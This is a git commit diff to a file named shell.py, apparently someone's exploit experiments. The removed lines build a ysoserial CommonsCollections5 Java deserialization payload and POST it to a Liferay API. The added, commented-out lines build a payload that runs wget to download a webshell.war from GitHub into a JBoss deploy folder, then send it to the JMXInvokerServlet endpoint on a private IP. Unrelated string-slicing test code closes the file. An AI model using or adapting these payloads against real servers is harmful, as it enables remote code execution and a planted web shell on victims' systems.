7ad0ea43ec460c9c38fb1acec224b9f636bac18b
KirKenx <50475316+KirKenx@users.noreply.github.com>
2020-03-10 00:23:43 +0700

    te

--- shell.py
+++ shell.py
@@ -1,7 +1,11 @@
-import requests
+# import requests
+# from subprocess import check_output
 
-from subprocess import check_output
-o=check_output("java -jar ysoserial.jar CommonsCollections5 calc", shell=True)
-res=requests.post('http://localhost:8080/api/liferay',data=o)
-print(res.status_code)
 
+# o=check_output('java -jar ysoserial.jar CommonsCollections5 "wget -P /usr/share/jboss-5.1.0.GA/server/default/deploy https://github.com/tghosth/webshelljar/raw/master/webshell.war"', shell=True)
+# res=requests.post('http://192.168.21.136:8080/invoker/JMXInvokerServlet',data=o)
+# print(o)
+s="aaaaf"
+s=s[0:4]+s[4:]
+# s="as"
+print(s)
